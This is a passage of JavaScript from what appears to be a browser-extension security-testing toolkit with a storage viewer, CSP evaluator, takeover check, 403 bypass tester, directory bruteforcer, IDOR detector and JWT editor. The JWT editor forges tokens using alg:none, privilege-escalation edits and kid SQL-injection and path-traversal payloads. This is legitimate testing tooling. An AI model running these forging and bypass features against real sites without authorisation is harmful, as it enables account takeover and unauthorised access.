      <option value="">Select a JS file…</option>
      ${scripts.slice(0, 30).map((s, i) => `<option value="${esc(s)}">${esc(s.split('/').pop() || s).slice(0, 50)}</option>`).join('')}
    </select>
    <div class="tool-input-row mb-6"><button class="btn-sm primary" id="jb-go">Beautify</button><button class="btn-sm" id="jb-copy">Copy</button><button class="btn-sm" id="jb-dl">Download</button></div>
    <textarea class="tool-input" id="jb-out" rows="12" readonly style="font-size:10px;min-height:200px" placeholder="Beautified output…"></textarea>`;
  let beautified = '';
  b.querySelector('#jb-go')?.addEventListener('click', async () => {
    const url = b.querySelector('#jb-select').value;
    if (!url) return;
    b.querySelector('#jb-out').value = 'Loading & beautifying…';
    const r = await chrome.runtime.sendMessage({ type: 'FETCH_JS', url });
    if (!r.ok) { b.querySelector('#jb-out').value = 'Error: ' + r.error; return; }
    beautified = jsBeautify(r.text);
    b.querySelector('#jb-out').value = beautified;
    log('Beautified: ' + url.split('/').pop(), 'success');
  });
  b.querySelector('#jb-copy')?.addEventListener('click', () => copyText(beautified || b.querySelector('#jb-out').value));
  b.querySelector('#jb-dl')?.addEventListener('click', () => { if (beautified) downloadText(beautified, 'beautified.js'); });
}

function jsBeautify(code) {
  let out = '', indent = 0, inStr = false, strChar = '', escaped = false;
  let inLineComment = false, inBlockComment = false;
  const addNewline = () => { out += '\n' + '  '.repeat(Math.max(0, indent)); };
  for (let i = 0; i < code.length; i++) {
    const c = code[i], prev = code[i - 1], next = code[i + 1];
    // Line comments
    if (!inStr && !inBlockComment && c === '/' && next === '/') { inLineComment = true; out += c; continue; }
    if (inLineComment) { out += c; if (c === '\n') inLineComment = false; continue; }
    // Block comments
    if (!inStr && !inLineComment && c === '/' && next === '*') { inBlockComment = true; out += c; continue; }
    if (inBlockComment) { out += c; if (c === '*' && next === '/') { out += '/'; i++; inBlockComment = false; } continue; }
    if (escaped) { out += c; escaped = false; continue; }
    if (c === '\\') { out += c; escaped = true; continue; }
    if (inStr) { out += c; if (c === strChar && strChar !== '`') inStr = false;
      if (strChar === '`' && c === '`') inStr = false; continue; }
    if (c === '"' || c === "'" || c === '`') { out += c; inStr = true; strChar = c; continue; }
    if (c === '{' || c === '[') { out += c; indent++; addNewline(); continue; }
    if (c === '}' || c === ']') { indent--; addNewline(); out += c; continue; }
    if (c === ';') { out += c; if (next !== '}' && next !== ']') addNewline(); continue; }
    if (c === ',') { out += c; if (indent > 0) addNewline(); continue; }
    out += c;
  }
  return out;
}

// ═══ STORAGE VIEWER ═══
async function toolStorage() {
  const b = showResults('clientdata', 'Storage', true);
  const res = await msgTab({ type: 'GET_STORAGE' });
  if (!res?.ok) { b.innerHTML = errMsg(res?.error || 'Cannot access page storage'); return; }
  const ls = Object.entries(res.data.localStorage || {});
  const ss = Object.entries(res.data.sessionStorage || {});
  const jwtPattern = /^eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/;

  let html = `<div class="text-xs text-muted mb-4">Page: ${esc(activeTabUrl)}</div>`;
  // Flag JWTs and interesting keys
  const securityKeys = /token|jwt|auth|session|key|secret|password|credential|access|refresh|api/i;

  if (ls.length) {
    html += `<div class="result-label mt-4 mb-4">localStorage (${ls.length})</div>`;
    ls.forEach(([k, v]) => {
      const isJwt = jwtPattern.test(v);
      const isSecurity = securityKeys.test(k);
      html += `<div class="result-item ${isJwt ? 'high' : isSecurity ? 'medium' : 'info'}" style="cursor:pointer">
        <div class="result-label">${isJwt ? '🎟 ' : isSecurity ? '🔑 ' : ''}${esc(k)}</div>
        <div class="result-value" style="font-size:9.5px;word-break:break-all">${esc((v || '').slice(0, 120))}</div>
        ${isJwt ? '<div class="text-xs text-accent">JWT detected — use JWT Editor to decode</div>' : ''}
      </div>`;
    });
  }
  if (ss.length) {
    html += `<div class="result-label mt-6 mb-4">sessionStorage (${ss.length})</div>`;
    ss.forEach(([k, v]) => {
      const isJwt = jwtPattern.test(v);
      const isSecurity = securityKeys.test(k);
      html += `<div class="result-item ${isJwt ? 'high' : isSecurity ? 'medium' : 'info'}" style="cursor:pointer">
        <div class="result-label">${isJwt ? '🎟 ' : isSecurity ? '🔑 ' : ''}${esc(k)}</div>
        <div class="result-value" style="font-size:9.5px;word-break:break-all">${esc((v || '').slice(0, 120))}</div>
        ${isJwt ? '<div class="text-xs text-accent">JWT detected — use JWT Editor to decode</div>' : ''}
      </div>`;
    });
  }
  if (!ls.length && !ss.length) html += '<div class="text-muted text-sm">No data in localStorage or sessionStorage</div>';
  else {
    html += `<div class="tool-input-row mt-6"><button class="btn-sm" id="st-copy">Copy All</button><button class="btn-sm" id="st-json">Copy JSON</button></div>`;
  }
  b.innerHTML = html;
  b.querySelector('#st-copy')?.addEventListener('click', () => {
    const lines = [...ls.map(([k,v]) => `[localStorage] ${k} = ${v}`), ...ss.map(([k,v]) => `[sessionStorage] ${k} = ${v}`)];
    copyText(lines.join('\n'));
  });
  b.querySelector('#st-json')?.addEventListener('click', () => copyText(JSON.stringify(res.data, null, 2)));
  finalizeResults('discovery');
}

// ═══ CSP EVALUATOR ═══
async function toolCspEval() {
  const b = showResults('discovery', 'CSP Evaluator', true);
  const hRes = await chrome.runtime.sendMessage({ type: 'GET_HEADERS', tabId: activeTabId });
  let csp = null;
  if (hRes.headers?.responseHeaders) {
    const cspH = hRes.headers.responseHeaders.find(h => h.name.toLowerCase() === 'content-security-policy');
    if (cspH) csp = cspH.value;
  }
  if (!csp) {
    // Check meta tag CSP (common in SPAs)
    try {
      const metaRes = await msgTab({ type: 'GET_META_CSP' });
      if (metaRes?.csp) {
        csp = metaRes.csp;
        // Will show source below
      }
    } catch {}
  }
  if (!csp) {
    b.innerHTML = '<div class="result-item high"><div class="result-label">No CSP</div><div class="result-value">No Content-Security-Policy header or meta tag found. All resources allowed from any origin. XSS has no mitigation.</div></div>';
    finalizeResults('discovery'); return;
  }
  const cspSource = csp === (hRes.headers?.responseHeaders?.find(h => h.name.toLowerCase() === 'content-security-policy')?.value) ? 'HTTP header' : '<meta> tag';
  const r = await chrome.runtime.sendMessage({ type: 'EVALUATE_CSP', csp });
  if (!r.ok) { b.innerHTML = errMsg(r.error); return; }
  const gradeClass = 'grade-' + r.grade.toLowerCase();
  b.innerHTML = `<div style="display:flex;align-items:center;margin-bottom:8px"><span class="header-grade ${gradeClass}">${r.grade}</span><span class="text-sm">${r.findings.length} finding${r.findings.length===1?'':'s'} · Source: ${cspSource}</span></div>` +
    `<div class="result-item info mb-6"><div class="result-label">Raw CSP</div><div class="result-value" style="font-size:9px;word-break:break-all">${esc(r.raw)}</div></div>` +
    r.findings.map(f => `<div class="result-item ${f.severity}"><div class="result-label"><span class="result-tag tag-${f.severity}">${f.severity}</span>${esc(f.directive)}: ${esc(f.issue)}</div><div class="result-value">${esc(f.detail)}</div></div>`).join('');
  finalizeResults('discovery');
  log('CSP: Grade ' + r.grade + ' (' + r.findings.length + ' findings)', r.grade <= 'B' ? 'success' : 'warn');
}

// ═══ SUBDOMAIN TAKEOVER ═══
async function toolTakeover() {
  const b = showResults('recon', 'Takeover Check', true);
  // First get subdomains
  b.innerHTML = '<div class="loading-text"><span class="spinner"></span> Step 1: Enumerating subdomains…</div>';
  const root = getRootDomain(activeTabDomain);
  const subRes = await chrome.runtime.sendMessage({ type: 'ENUM_SUBDOMAINS', domain: root });
  if (!subRes.ok) { b.innerHTML = errMsg('Need subdomains first: ' + (subRes.error||'enum failed')); return; }
  const subs = subRes.subdomains.filter(s => !s.startsWith('*')).slice(0, 30);
  b.innerHTML = `<div class="loading-text"><span class="spinner"></span> Step 2: Checking ${subs.length} subdomains for dangling CNAMEs…</div>`;
  const r = await chrome.runtime.sendMessage({ type: 'CHECK_TAKEOVER', subdomains: subs });
  if (!r.ok) { b.innerHTML = errMsg(r.error); return; }
  if (!r.results.length) {
    b.innerHTML = `<div class="text-muted text-sm">No dangling CNAMEs found across ${subs.length} subdomains</div>`;
    finalizeResults('discovery'); return;
  }
  const vulns = r.results.filter(x => x.vulnerable);
  b.innerHTML = `<div class="flex-between mb-6"><span class="text-sm">${r.results.length} CNAME matches, <span class="${vulns.length?'text-accent':'text-muted'}" style="font-weight:700">${vulns.length} potentially vulnerable</span></span></div>` +
    r.results.map(x => `<div class="result-item ${x.vulnerable ? 'high' : x.errorType === 'CONNECTION_REFUSED' ? 'medium' : 'low'}">
      <div class="result-label"><span class="result-tag ${x.vulnerable ? 'tag-high' : x.errorType === 'CONNECTION_REFUSED' ? 'tag-medium' : 'tag-low'}">${x.vulnerable ? 'VULN' : x.errorType || 'OK'}</span>${esc(x.service)}</div>
      <div class="result-value">${esc(x.subdomain)} → ${esc(x.cname)}</div>
      ${x.errorType === 'CONNECTION_REFUSED' ? '<div class="text-xs" style="color:var(--warning)">Connection refused — moderate takeover signal, verify manually</div>' : ''}
      ${x.errorType === 'TIMEOUT' ? '<div class="text-xs text-muted">Timeout — weak signal, likely not takeover</div>' : ''}
      ${x.errorType === 'DNS_NXDOMAIN' ? '<div class="text-xs text-accent">DNS does not resolve — strong takeover signal!</div>' : ''}
    </div>`).join('');
  finalizeResults('discovery');
  log(`Takeover: ${vulns.length} vulnerable of ${r.results.length} checked`, vulns.length ? 'warn' : 'success');
}

// ═══ 403 BYPASS TESTER ═══
async function tool403Bypass() {
  const b = showResults('offensive', '403 Bypass', true);
  b.innerHTML = `<div class="tool-input-row mb-6"><input class="tool-input" id="bp-url" value="${esc(activeTabUrl)}"><button class="btn-sm primary" id="bp-go">Test 17 Bypasses</button></div><div id="bp-out"></div>`;
  b.querySelector('#bp-go').addEventListener('click', async () => {
    const out = b.querySelector('#bp-out');
    out.innerHTML = '<div class="loading-text"><span class="spinner"></span> Testing bypass techniques…</div>';
    const r = await chrome.runtime.sendMessage({ type: 'BYPASS_403', url: b.querySelector('#bp-url').value });
    if (!r.ok) { out.innerHTML = errMsg(r.error); return; }
    const bypasses = r.results.filter(x => x.bypass);
    out.innerHTML = `<div class="flex-between mb-6"><span class="text-sm">Baseline: HTTP ${r.baseStatus}</span><span class="text-sm ${bypasses.length?'text-accent':''}" style="font-weight:700">${bypasses.length} bypass${bypasses.length===1?'':'es'} found</span></div>` +
      r.results.filter(x=>x.type!=='baseline').map(x => `<div class="result-item ${x.bypass?'high':x.status===200?'medium':'info'}">
        <div class="result-label"><span class="result-tag ${x.bypass?'tag-high':'tag-info'}">${x.status}</span> ${esc(x.type)}</div>
        <div class="result-value">${esc(x.technique)}</div>
        ${x.bypass?'<div class="text-xs text-accent" style="font-weight:600">BYPASS — got '+x.status+' instead of '+r.baseStatus+'!</div>':''}
        ${x.verdict?`<div class="text-xs text-muted">${esc(x.verdict)}</div>`:''}
        ${x.preview?`<div style="margin-top:4px;padding:4px 6px;background:var(--danger-soft);border-radius:3px;font-family:var(--font-mono);font-size:9px;max-height:60px;overflow:auto">${esc(x.preview.slice(0,200))}</div>`:''}
      </div>`).join('');
    finalizeResults('offensive');
    log(`403 bypass: ${bypasses.length} found`, bypasses.length ? 'warn' : 'success');
  });
}

// ═══ HTTP METHOD TESTER ═══
async function toolMethodTest() {
  const b = showResults('offensive', 'Method Tester', false);
  b.innerHTML = `<div class="tool-input-row mb-6"><input class="tool-input" id="mt-url" value="${esc(activeTabUrl)}" placeholder="URL to test"><button class="btn-sm primary" id="mt-go">Test 8 Methods</button></div><div id="mt-out"></div>`;
  const runTest = async () => {
    const url = b.querySelector('#mt-url').value;
    const out = b.querySelector('#mt-out');
    out.innerHTML = '<div class="loading-text"><span class="spinner"></span> Testing 8 HTTP methods (authenticated)...</div>';
    const r = await chrome.runtime.sendMessage({ type: 'METHOD_TEST', url });
    if (!r.ok) { out.innerHTML = errMsg(r.error); return; }
    const baseline = r.results[0];
    out.innerHTML = `<div class="text-sm mb-6">${esc(url)}<br><span class="text-xs text-muted">Baseline GET: ${baseline.status} · ${baseline.bodyLen}b</span></div>` +
      r.results.map(x => {
        let sev = 'info', verdict = '';
        if (x.error) { sev = 'info'; verdict = x.error; }
        else if (x.baseline) { verdict = 'Baseline reference'; }
        else if (x.traceEcho) { sev = 'high'; verdict = 'TRACE echoes request headers back — XST (Cross-Site Tracing) possible!'; }
        else if (x.realDanger) { sev = 'high'; verdict = `${x.method} returns DIFFERENT response (${x.bodyDiff}b diff) — likely processed! Investigate.`; }
        else if (x.fakeAccept) { sev = 'info'; verdict = `Same page as GET (${x.bodyDiff}b) — server ignores method, not a real finding`; }
        else if (x.status === 405) { verdict = 'Method not allowed (expected)'; }
        else if (x.status !== baseline.status) { sev = 'low'; verdict = `Different status than GET (${baseline.status})  — worth investigating`; }
        else { verdict = 'Same as GET'; }
        return `<div class="result-item ${sev}">
          <div class="result-label"><span class="result-tag tag-${sev === 'high' ? 'high' : sev === 'low' ? 'low' : 'info'}">${x.status}</span> ${x.method}</div>
          <div class="result-value">${x.bodyLen !== undefined ? x.bodyLen + 'b' : ''} ${x.allow ? '· Allow: ' + esc(x.allow) : ''}</div>
          <div class="text-xs" style="color:var(--text-secondary)">${verdict}</div>
          ${x.preview ? `<div style="margin-top:4px;padding:4px 6px;background:var(--danger-soft);border-radius:3px;font-family:var(--font-mono);font-size:9px;max-height:50px;overflow:auto">${esc(x.preview)}</div>` : ''}
        </div>`;
      }).join('');
    finalizeResults('offensive');
  };
  b.querySelector('#mt-go')?.addEventListener('click', runTest);
}

// ═══ JWT EDITOR ═══
function toolJwtEditor() {
  const b = showResults('clientdata', 'JWT Editor', false);
  b.innerHTML = `<div class="text-sm mb-6">Paste a JWT token or auto-detect from cookies</div>
    <div class="tool-input-row"><textarea class="tool-input" id="jwt-in" rows="3" placeholder="eyJhbGciOiJIUzI1NiIs…"></textarea></div>
    <div class="codec-row mb-6">
      <button class="btn-sm primary" id="jwt-decode">Decode</button>
      <button class="btn-sm" id="jwt-detect">Auto-detect from cookies</button>
    </div>
    <div id="jwt-out"></div>`;

  b.querySelector('#jwt-detect')?.addEventListener('click', async () => {
    const cookies = await chrome.runtime.sendMessage({ type: 'GET_COOKIES', domain: activeTabDomain });
    if (!cookies.ok) return;
    const jwtCookie = cookies.cookies.find(c => /^eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/.test(c.value));
    if (jwtCookie) { b.querySelector('#jwt-in').value = jwtCookie.value; log('Found JWT in cookie: ' + jwtCookie.name, 'success'); }
    else { log('No JWT found in cookies', 'warn'); }
  });

  b.querySelector('#jwt-decode')?.addEventListener('click', () => {
    const token = b.querySelector('#jwt-in').value.trim();
    const out = b.querySelector('#jwt-out');
    try {
      const parts = token.split('.');
      if (parts.length !== 3) { out.innerHTML = errMsg('Invalid JWT — need 3 dot-separated parts'); return; }
      const header = JSON.parse(atob(parts[0].replace(/-/g,'+').replace(/_/g,'/')));
      const payload = JSON.parse(atob(parts[1].replace(/-/g,'+').replace(/_/g,'/')));
      const expiry = payload.exp ? new Date(payload.exp * 1000).toISOString() : 'none';
      const expired = payload.exp ? payload.exp * 1000 < Date.now() : false;
      const expiryDays = payload.exp ? Math.floor((payload.exp * 1000 - Date.now()) / 86400000) : null;
      const expiryText = expired ? `EXPIRED ${Math.abs(expiryDays)} days ago` : expiryDays !== null ? `Valid for ${expiryDays} more days` : 'No expiry set';
      const hasKid = header.kid !== undefined;

      const authClaims = ['role','admin','is_admin','is_staff','permissions','groups','scope','aud','tenant_id','user_id','userId','uid','email','username'];
      const flaggedClaims = Object.keys(payload).filter(k => authClaims.includes(k));

      out.innerHTML = `<div class="result-item ${expired?'medium':'info'}"><div class="result-label">Header (alg: ${esc(header.alg)}${hasKid ? ' | kid: ' + esc(String(header.kid)) : ''})</div><div class="result-value"><pre style="white-space:pre-wrap">${esc(JSON.stringify(header,null,2))}</pre></div>${hasKid ? '<div class="text-xs" style="color:var(--warning)">kid header present — try kid injection payloads below</div>' : ''}</div>
        <div class="result-item ${expired?'high':'info'}"><div class="result-label">Payload — <span style="color:${expired?'var(--danger)':'var(--success)'}; font-weight:700">${expiryText}</span></div><div class="result-value"><pre style="white-space:pre-wrap">${esc(JSON.stringify(payload,null,2))}</pre></div><div class="text-xs text-muted">Expires: ${expiry}</div></div>
        ${flaggedClaims.length ? `<div class="result-item medium"><div class="result-label">🎯 Auth Claims Detected</div><div class="result-value">${flaggedClaims.map(k => `<strong>${esc(k)}</strong>: ${esc(String(payload[k]))}`).join(' · ')}</div><div class="text-xs" style="color:var(--warning)">These control authorization — modify with quick edits below</div></div>` : ''}
        <div class="result-label mt-6 mb-4">Edit & Re-encode</div>
        <textarea class="tool-input mb-4" id="jwt-edit" rows="6" style="font-size:10px">${esc(JSON.stringify(payload,null,2))}</textarea>
        <div class="codec-row">
          <button class="btn-sm primary" id="jwt-none">alg:none (no sig)</button>
          <button class="btn-sm" id="jwt-resign">Re-encode (keep alg)</button>
          <button class="btn-sm" id="jwt-copy">Copy token</button>
        </div>
        <div class="text-xs" style="color:var(--warning);margin-top:4px">Note: "Re-encode (keep alg)" reuses the original signature. The token will be invalid unless the server doesn't verify signatures. Use "alg:none" to strip the signature entirely.</div>
        <div class="result-label mt-6 mb-4">Quick Edits</div>
        <div class="codec-row mb-4">
          <button class="btn-sm jwt-qe" data-qe="admin">role→admin</button>
          <button class="btn-sm jwt-qe" data-qe="uid1">user_id→1</button>
          <button class="btn-sm jwt-qe" data-qe="expiry">+1yr expiry</button>
          <button class="btn-sm jwt-qe" data-qe="email">email→admin@</button>
        </div>
        <div class="result-label mt-4 mb-4">Header Attacks</div>
        <div class="codec-row mb-4">
          <button class="btn-sm jwt-he" data-he="kid-sqli">kid SQL injection</button>
          <button class="btn-sm jwt-he" data-he="kid-path">kid path traversal</button>
          <button class="btn-sm jwt-he" data-he="kid-empty">kid empty string</button>
        </div>
        <textarea class="tool-input mt-6" id="jwt-result" rows="2" readonly placeholder="Modified token…"></textarea>`;

      const b64url = (s) => btoa(unescape(encodeURIComponent(s))).replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');
      // Quick edit presets
      out.querySelectorAll('.jwt-qe').forEach(btn => btn.addEventListener('click', () => {
        try {
          const ed = out.querySelector('#jwt-edit');
          const p = JSON.parse(ed.value);
          switch (btn.dataset.qe) {
            case 'admin':
              if (p.role) p.role = 'admin';
              else if (p.roles) p.roles = ['admin'];
              else if (p.is_admin !== undefined) p.is_admin = true;
              else p.role = 'admin';
              break;
            case 'uid1':
              ['user_id','userId','uid','sub','id','user'].forEach(k => { if (p[k] !== undefined) p[k] = typeof p[k] === 'number' ? 1 : '1'; });
              if (!['user_id','userId','uid','sub','id','user'].some(k => p[k] !== undefined)) p.sub = '1';
              break;
            case 'expiry':
              p.exp = Math.floor(Date.now()/1000) + 365*24*60*60;
              p.iat = Math.floor(Date.now()/1000);
              break;
            case 'email':
              ['email','mail','e-mail'].forEach(k => { if (p[k]) p[k] = 'admin@' + (p[k].split('@')[1] || 'target.com'); });
              if (!p.email) p.email = 'admin@target.com';
              break;
          }
          ed.value = JSON.stringify(p, null, 2);
        } catch {}
      }));
      out.querySelector('#jwt-none')?.addEventListener('click', () => {
        try {
          const newPayload = JSON.parse(out.querySelector('#jwt-edit').value);
          const newHeader = { alg: 'none', typ: 'JWT' };
          const token = b64url(JSON.stringify(newHeader)) + '.' + b64url(JSON.stringify(newPayload)) + '.';
          out.querySelector('#jwt-result').value = token;
        } catch (e) { out.querySelector('#jwt-result').value = 'Error: ' + e.message; }
      });
      // Header attack handlers
      out.querySelectorAll('.jwt-he').forEach(btn => btn.addEventListener('click', () => {
        try {
          const newPayload = JSON.parse(out.querySelector('#jwt-edit').value);
          const newHeader = { ...header };
          switch (btn.dataset.he) {
            case 'kid-sqli': newHeader.kid = "' UNION SELECT 'secret' --"; break;
            case 'kid-path': newHeader.kid = '../../../../dev/null'; break;
            case 'kid-empty': newHeader.kid = ''; break;
          }
          newHeader.alg = 'none';
          const token = b64url(JSON.stringify(newHeader)) + '.' + b64url(JSON.stringify(newPayload)) + '.';
          out.querySelector('#jwt-result').value = token;
          log('JWT header attack: ' + btn.dataset.he, 'info');
        } catch (e) { out.querySelector('#jwt-result').value = 'Error: ' + e.message; }
      }));
      out.querySelector('#jwt-resign')?.addEventListener('click', () => {
        try {
          const newPayload = JSON.parse(out.querySelector('#jwt-edit').value);
          const token = b64url(JSON.stringify(header)) + '.' + b64url(JSON.stringify(newPayload)) + '.' + parts[2];
          out.querySelector('#jwt-result').value = token;
        } catch (e) { out.querySelector('#jwt-result').value = 'Error: ' + e.message; }
      });
      out.querySelector('#jwt-copy')?.addEventListener('click', () => { copyText(out.querySelector('#jwt-result').value); });
    } catch (e) { out.innerHTML = errMsg('JWT decode failed: ' + e.message); }
  });
}

// ═══ DIRECTORY BRUTEFORCER ═══
async function toolDirBrute() {
  const b = showResults('discovery', 'Dir Brute', false);
  const u = new URL(activeTabUrl);
  b.innerHTML = `<div class="text-sm mb-6">Scan: ${esc(u.origin)}</div>
    <div class="tool-input-row mb-4">
      <select class="tool-select" id="db-cat" style="font-size:10px">
        <option value="common">Common (17)</option>
        <option value="wordpress">WordPress (17)</option>
        <option value="php_laravel">PHP / Laravel (14)</option>
        <option value="java_spring">Java / Spring (14)</option>
        <option value="node_js">Node.js (13)</option>
        <option value="dotnet">.NET / ASP (11)</option>
        <option value="devops">DevOps / VCS (14)</option>
        <option value="backups">Backups (12)</option>
        <option value="all">All (~100)</option>
      </select>
      <select class="tool-select" id="db-scope" style="font-size:10px;max-width:100px">
        <option value="root">Root only</option>
        <option value="current">Current path</option>
        <option value="both" selected>Both</option>
      </select>
      <button class="btn-sm primary" id="db-go">Scan</button>
    </div>
    <details style="margin-bottom:8px"><summary class="text-xs text-muted" style="cursor:pointer">Custom paths</summary>
      <textarea class="tool-input mt-4" id="db-custom" rows="3" placeholder="One path per line, e.g.:\n/api/v2/admin\n/internal/debug\n/graphql/console"></textarea>
      <button class="btn-sm mt-4" id="db-custom-go">Scan Custom Only</button>
    </details>
    <div id="db-out"></div>`;

  const runScan = async (category) => {
    const out = b.querySelector('#db-out');
    const scope = b.querySelector('#db-scope')?.value || 'both';
    out.innerHTML = '<div class="loading-text"><span class="spinner"></span> Scanning…</div>';
    const scanUrl = scope === 'root' ? new URL(activeTabUrl).origin + '/' : activeTabUrl;
    const r = await chrome.runtime.sendMessage({ type: 'DIR_BRUTE', url: scanUrl, category, scope });
    if (!r.ok) { out.innerHTML = errMsg(r.error); return; }
    renderDirResults(out, r);
  };
  const renderDirResults = (out, r) => {
    if (!r.results.length) { out.innerHTML = `<div class="text-muted text-sm">Nothing found across ${r.total} paths</div>`; finalizeResults('discovery'); return; }
    out.innerHTML = `<div class="flex-between mb-6"><span class="text-sm">${r.results.length} found / ${r.total} tested</span></div>` +
      r.results.map(x => {
        const sev = x.isRedirectCatchall ? 'info' : x.status === 200 ? 'high' : x.status === 403 || x.status === 401 ? 'medium' : 'low';
        const statusLabel = x.isRedirectCatchall ? 'REDIR' : x.status === 200 ? 'OPEN' : x.status === 403 ? 'FORBIDDEN' : x.status === 401 ? 'AUTH REQ' : x.status;
        const fullUrl = new URL(activeTabUrl).origin + x.path;
        return `<div class="result-item ${sev}" style="cursor:pointer">
          <div class="result-label"><span class="result-tag tag-${sev}">${statusLabel}</span> <a href="${esc(fullUrl)}" target="_blank" style="color:var(--accent);text-decoration:none">${esc(x.path)}</a></div>
          ${x.preview ? `<div class="result-value" style="font-size:9px;max-height:50px;overflow:hidden;margin-top:3px">${esc(x.preview.slice(0,180))}</div>` : ''}
          <div class="text-xs text-muted">${esc(fullUrl)}</div>
        </div>`;
      }).join('');
    finalizeResults('discovery');
  };

  b.querySelector('#db-go').addEventListener('click', () => runScan(b.querySelector('#db-cat').value));
  b.querySelector('#db-custom-go')?.addEventListener('click', async () => {
    const paths = (b.querySelector('#db-custom')?.value || '').split('\n').map(s => s.trim()).filter(Boolean).map(p => p.startsWith('/') ? p : '/' + p);
    if (!paths.length) return;
    const out = b.querySelector('#db-out');
    out.innerHTML = '<div class="loading-text"><span class="spinner"></span> Scanning custom paths…</div>';
    const origin = new URL(activeTabUrl).origin;
    const results = [];
    for (let i = 0; i < paths.length; i += 8) {
      const batch = paths.slice(i, i + 8);
      const promises = batch.map(async path => {
        try {
          const r = await fetch(origin + path, { redirect: 'manual', signal: AbortSignal.timeout(2000) });
          const interesting = r.status === 200 || r.status === 301 || r.status === 302 || r.status === 401 || r.status === 403;
          if (interesting) { let preview = ''; if (r.status === 200) { try { preview = (await r.text()).slice(0, 200); } catch {} } return { path, status: r.status, preview }; }
          return null;
        } catch { return null; }
      });
      (await Promise.all(promises)).forEach(r => { if (r) results.push(r); });
    }
    renderDirResults(out, { results, total: paths.length });
    log(`Custom dir scan: ${results.length}/${paths.length}`, 'success');
  });
}

// ═══ IDOR DETECTOR ═══
async function toolIdor() {
  const b = showResults('offensive', 'IDOR Detector', true);
  b.innerHTML = '<div class="loading-text"><span class="spinner"></span> Scanning URLs, XHR, and page links…</div>';
  const findings = [];
  const seen = new Set();

  // Params that are NEVER IDOR candidates
  const ignoreParams = /^(sentry_|utm_|_ga|gclid|fbclid|dclid|msclkid|__cf|__utm|_gid|_gcl|gtm_|mc_|yclid|twclid|li_|ref|locale|lang|page|per_page|limit|offset|sort|order|format|callback|v|ver|version|t|timestamp|ts|nonce|rand|cache|_$|__|width|height|size|w|h|quality|q|dpr|fit|crop|count|quantity|zip|postal|lat|lng|lon|latitude|longitude)/i;
  const ignoreHosts = /sentry\.io|google-analytics|analytics|doubleclick|facebook\.com|googletagmanager|hotjar|clarity\.ms|newrelic|datadog/i;
  const idorPathHints = /users?|orders?|accounts?|profiles?|invoices?|tickets?|messages?|posts?|comments?|products?|items?|documents?|files?|reports?|transactions?|payments?|pantanir|notendur|vidskiptavinir|customers?|bookings?|reservations?/i;
  // Paths where IDs are rarely IDOR-relevant
  const ignorePathContexts = /static|assets|images?|img|css|js|fonts?|media|uploads?|cdn|public|dist|build|bundle|vendor|node_modules|\.min\.|\.map$/i;

  const analyzeUrl = (urlStr, source) => {
    try {
      const u = new URL(urlStr);
      if (ignoreHosts.test(u.hostname)) return;
      // Query params
      u.searchParams.forEach((v, k) => {
        if (ignoreParams.test(k)) return;
        const key = k + '=' + v;
        if (seen.has(key)) return; seen.add(key);
        if (/^\d{1,15}$/.test(v) && v.length >= 2) {
          findings.push({ source, param: k, value: v, type: 'numeric', url: urlStr, suggest: [String(BigInt(v)-1n), String(BigInt(v)+1n), '0', '1'], predictability: 'Sequential integers — trivially enumerable', priority: /id|num|order|user|account/i.test(k) ? 'high' : 'medium' });
        }
        else if (/^[0-9a-f]{8}-[0-9a-f]{4}-1[0-9a-f]{3}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(v)) findings.push({ source, param: k, value: v, type: 'UUID v1', url: urlStr, suggest: ['Time-based — partially predictable'], predictability: 'UUID v1 encodes timestamp — adjacent UUIDs predictable', priority: 'high' });
        else if (/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(v)) findings.push({ source, param: k, value: v, type: 'UUID v4', url: urlStr, suggest: ['Random — check if app leaks others'], predictability: 'UUID v4 (random) — not enumerable alone', priority: /id|page/i.test(k) ? 'high' : 'medium' });
        else if (/^[0-9a-f]{24}$/i.test(v)) findings.push({ source, param: k, value: v, type: 'ObjectId', url: urlStr, suggest: ['Increment last hex chars'], predictability: 'MongoDB ObjectId — timestamp in first 4 bytes', priority: 'high' });
      });
      // Path segments with context
      const segments = u.pathname.split('/').filter(Boolean);
      // Skip static asset paths entirely
      if (ignorePathContexts.test(u.pathname)) return;
      segments.forEach((seg, i) => {
        const key = 'path:' + seg;
        if (seen.has(key)) return; seen.add(key);
        const prevSeg = i > 0 ? segments[i - 1] : '';
        const contextHint = idorPathHints.test(prevSeg) ? prevSeg : '';
        if (/^\d{2,15}$/.test(seg)) {
          findings.push({
            source: source + (contextHint ? ' (/' + contextHint + '/)' : ''),
            param: contextHint ? contextHint + '/' + seg : 'path[' + (i+1) + ']',
            value: seg, type: 'numeric', url: urlStr,
            suggest: [String(BigInt(seg)-1n), String(BigInt(seg)+1n), '0', '1'],
            predictability: 'Sequential ID' + (contextHint ? ' in /' + contextHint + '/ — high-value IDOR target' : ' in URL path'),
            priority: contextHint ? 'high' : 'medium'
          });
        }
        else if (/^[0-9a-f]{8}-[0-9a-f]{4}/i.test(seg)) {
          findings.push({ source, param: contextHint ? contextHint + '/' + seg.slice(0,8) + '…' : 'path[' + (i+1) + ']', value: seg, type: 'UUID', url: urlStr, suggest: ['Try another UUID'], predictability: contextHint ? 'UUID in /' + contextHint + '/' : 'UUID in path', priority: contextHint ? 'high' : 'medium' });
        }
      });
    } catch {}
  };

  analyzeUrl(activeTabUrl, 'Current URL');
  const reqs = await chrome.runtime.sendMessage({ type: 'GET_CAPTURED_REQUESTS', tabId: activeTabId });
  (reqs.requests || []).slice(-30).forEach(r => analyzeUrl(r.url, 'XHR ' + (r.method || 'GET')));
  try {
    const linkRes = await msgTab({ type: 'EXTRACT_LINKS' });
    if (linkRes?.ok) {
      [...(linkRes.data.internal || []), ...(linkRes.data.external || [])].forEach(l => analyzeUrl(l.url || l, 'Page link'));
    }
  } catch {}

  findings.sort((a, c) => {
    if (a.priority === 'high' && c.priority !== 'high') return -1;
    if (c.priority === 'high' && a.priority !== 'high') return 1;
    if (a.source.startsWith('Current')) return -1;
    return 0;
  });

  if (!findings.length) {
    b.innerHTML = '<div class="text-xs text-muted mb-4">Page: ' + esc(activeTabUrl) + '</div><div class="text-muted text-sm">No IDOR candidates in URL, XHR, or page links</div>';
    finalizeResults('discovery'); return;
  }
